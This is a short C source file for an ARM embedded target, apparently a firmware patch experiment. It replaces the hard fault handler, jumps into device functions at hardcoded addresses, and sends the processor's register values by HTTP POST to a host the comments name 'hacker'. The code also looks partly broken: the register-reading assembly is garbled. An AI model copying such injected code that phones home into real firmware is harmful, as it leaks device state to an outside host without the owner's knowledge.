struct processor_status {
    unsigned int r0;
    unsigned int r1;
    unsigned int r2;
    unsigned int r3;
    unsigned int r12;
    unsigned int lr;
    unsigned int pc;
    unsigned int psr;
};

void hard_fault_handler ( void )
{
    /* All function pointers +1 for thumb? */
    int (*do_HTTP_POST_request)(char *hostname, char *page, char *POST_params, char *result_buf, int size) = 0x16425;
    int (*sprintf)(char *str, char *format, ...) = 0x47915;
    char buf[100];
    struct processor_status *regs;

    asm volatile (/* " tst.w lr, #4\t\n" */
                  " mrs %0, cpsr\t\n" : "=r" (regs) : );
                  /*
                  " ite eq\t\n"
                  " mrseq.w r0, msp\t\n"
                  " msrne.w r0, psp\t\n"
                  : "=r" (regs) : );
                  */

    //sprintf(buf, "r0=%08x&r1=%08x&r2=%08x&r3=%08x&r12=%08x&lr=%08x&pc=%08x&psr=%08x", regs->r0, regs->r1, regs->r2, regs->r3, regs->r12, regs->lr, regs->pc, regs->psr);
    sprintf(buf, 0x5c22c, regs->r0, regs->r1, regs->r2, regs->r3, regs->r12, regs->lr, regs->pc, regs->psr);

    //do_HTTP_POST_request("hacker", "fault", buf, 0, 0);
    do_HTTP_POST_request(0x5c405, 0x5c448, buf, 0, 0);
}

int main ( void )
{
    return 0;
}
